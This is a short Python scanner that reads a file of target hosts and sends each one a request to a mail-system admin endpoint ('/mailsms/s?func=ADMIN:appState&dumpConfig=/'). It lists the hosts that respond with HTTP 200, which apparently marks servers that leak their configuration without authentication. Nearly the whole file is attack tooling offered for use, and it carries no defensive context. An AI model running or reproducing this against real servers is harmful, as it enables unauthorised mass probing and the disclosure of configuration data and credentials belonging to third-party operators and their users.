
# -*- coding: utf-8 -*-
#author：God_zZz
 
 
 
import requests
import argparse
import sys
parser = argparse.ArgumentParser(description="mail.py -t targer.txt")
parser.add_argument('-t','--target',metavar="",help="This is the address list (targer.txt)")
args = parser.parse_args()
url_file = args.target
headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0'}
payload = '/mailsms/s?func=ADMIN:appState&dumpConfig=/'
def scan(url_file):
    filelist = open(url_file,'r')
    target_list = filelist.readlines()
    all_url = len(target_list)
    print(all_url)
    for each in target_list:
        urllist = each.rstrip()+payload
        try:
            res = requests.get(urllist,headers=headers,timeout=1)
            code =res.status_code
            if code == 200:
                print(urllist)
        except:
            pass
    filelist.close()
 
def main():
    scan(url_file)
if __name__ == '__main__':
        main()
